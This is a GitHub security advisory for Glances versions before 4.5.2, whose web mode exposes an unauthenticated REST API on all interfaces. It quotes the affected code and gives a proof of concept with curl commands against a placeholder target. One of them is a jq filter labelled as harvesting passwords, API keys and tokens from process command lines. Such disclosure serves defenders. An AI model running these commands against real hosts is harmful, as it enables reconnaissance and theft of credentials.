# [H] Glances exposes the REST API without authentication

## Summary
Severity: High
Advisory: GHSA-wvxv-4j8q-4wjq
CVE: CVE-2026-32596
CWE: CWE-200
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-wvxv-4j8q-4wjq
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.2

## Details
### Summary
Glances web server runs without authentication by default when started with `glances -w`, exposing REST API with sensitive system information including process command-lines containing credentials (passwords, API keys, tokens) to any network client.

### Details
Root Cause: Authentication is optional and disabled by default. When no password is provided, the API router initializes without authentication dependency, and the server binds to 0.0.0.0 exposing all endpoints.

Affected Code:
- File: `glances/outputs/glances_restful_api.py`, lines 259-272

```python
if self.args.password:
    self._password = GlancesPassword(username=args.username, config=config)
    if JWT_AVAILABLE:
        jwt_secret = config.get_value('outputs', 'jwt_secret_key', default=None)
        jwt_expire = config.get_int_value('outputs', 'jwt_expire_minutes', default=60)
        self._jwt_handler = JWTHandler(secret_key=jwt_secret, expire_minutes=jwt_expire)
        logger.info(f"JWT authentication enabled (token expiration: {jwt_expire} minutes)")
    else:
        self._jwt_handler = None
        logger.info("JWT authentication not available (python-jose not installed)")
else:
    self._password = None  # NO AUTHENTICATION BY DEFAULT
    self._jwt_handler = None
```

- File: `glances/outputs/glances_restful_api.py`, lines 477-480

```python
if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)  # NO AUTH DEPENDENCY
```

- File: `glances/outputs/glances_restful_api.py`, lines 98-99

```python
self.bind_address = args.bind_address or "0.0.0.0"  # BINDS TO ALL INTERFACES
self.port = args.port or 61208
```

- File: `glances/plugins/processlist/__init__.py`, lines 127-140

```python
enable_stats = [
    'cpu_percent',
    'memory_percent',
    'memory_info',
    'pid',
    'username',
    'cpu_times',
    'num_threads',
    'nice',
    'status',
    'io_counters',
    'cpu_num',
    'cmdline',  # FULL COMMAND LINE EXPOSED, NO SANITIZATION
]
```

### PoC

1. Start Glances in default web server mode:
```bash
glances -w
# Output: Glances Web User Interface started on http://0.0.0.0:61208/
```

2. Access API without authentication from any network client:
```bash
curl -s http://TARGET:61208/api/4/system | jq .
```

<img width="593" height="265" alt="image" src="https://github.com/user-attachments/assets/4ec461be-b480-46d5-88e2-f4004f4dae54" />


3. Extract system information:
```bash
curl -s http://TARGET:61208/api/4/all > system_dump.json
```
<img width="688" height="547" alt="image" src="https://github.com/user-attachments/assets/7564fb2a-7d94-4c26-848a-03034214b8c7" />

4. Harvest credentials from process list:
```bash
curl -s http://TARGET:61208/api/4/processlist | \
  jq -r '.[] | select(.cmdline | tostring | test("password|api-key|token|secret"; "i")) | 
  {pid, username, process: .name, cmdline}'
```

5. Example credential exposure:
```json
{
  "pid": 4059,
  "username": "root",
  "process": "python3",
  "cmdline": [
    "python3",
    "-c",
    "import time; time.sleep(3600)",
    "--api-key=sk-super-secret-token-12345",
    "--password=MySecretPassword123",
    "--db-pass=admin123"
  ]
}
```

### Impact

Complete system reconnaissance and credential harvesting from any network client. Exposed endpoints include system info, process lists with full command-line arguments (containing passwords/API keys/tokens), network connections, filesystems, and Docker containers. Enables lateral movement and targeted attacks using stolen credentials.

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-wvxv-4j8q-4wjq
- https://nvd.nist.gov/vuln/detail/CVE-2026-32596
- https://github.com/nicolargo/glances/commit/208d876118fea5758970f33fd7474908bd403d25
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.2
